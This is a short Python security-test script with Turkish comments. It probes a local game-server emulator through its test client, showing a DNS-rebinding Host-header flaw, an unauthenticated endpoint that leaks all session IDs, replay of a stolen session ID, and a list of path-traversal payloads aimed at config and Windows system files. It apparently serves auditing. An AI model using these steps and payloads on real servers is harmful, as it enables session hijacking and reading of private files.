"""CEK: Host başlığı denetlenmiyor (DNS rebinding) ve /list_session çerezsiz isteğe bütün kayıtların oturum
kimliklerini (yani 'şifrelerini') veriyor. Ayrıca dosya yolu kaçış denemeleri."""
import sys, os, json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from ortam import kur, gateway, kayit, oturumlar, yaz, sessiz

srv, app, tmp = kur()
saldirgan = "kotu-site.example:5005"   # DNS'i 127.0.0.1'e çevrilmiş bir alan adı
c = app.test_client()
with sessiz():
    r = c.get("/list_session", headers={"Host": saldirgan, "Origin": "http://" + saldirgan})
liste = json.loads(r.data)
yaz("Çerezsiz GET /list_session (Host: %s) -> %s, %d kayıt; ilk kimlik: %s" % (saldirgan, r.status_code, len(liste),
    liste[0]["session_id"] if liste else None))
hedef = liste[0]["session_id"].split(":", 1)[1]
c2 = app.test_client()
c2.set_cookie("session", hedef, domain="kotu-site.example")
with sessiz():
    r = c2.get("/gazillionaire", headers={"Host": saldirgan, "Referer": "http://%s/x" % saldirgan})
yaz("Aynı kimlikle 'kendi' sitesinden GET /gazillionaire ->", r.status_code, r.headers.get("Location"),
    "| reject_cross_site_save_changes engellemedi (Referer netloc == Host)")

yaz("--- dosya yolları ---")
for yol in ("/assets/../../RaiseTheEmpires.ini", "/assets/..%2f..%2fRaiseTheEmpires.ini", "/img/..%5c..%5c..%5cempires-server.py",
            "/nullassets/C:/Windows/win.ini", "/css/%2e%2e/%2e%2e/save_engine.py", "/js/../../../README.md",
            "/nullassets/displays/dialogs/MechLabName.swf"):
    with sessiz():
        r = c.get(yol)
    yaz("%-48s -> %s %s" % (yol, r.status_code, (r.content_type or "")[:30]))
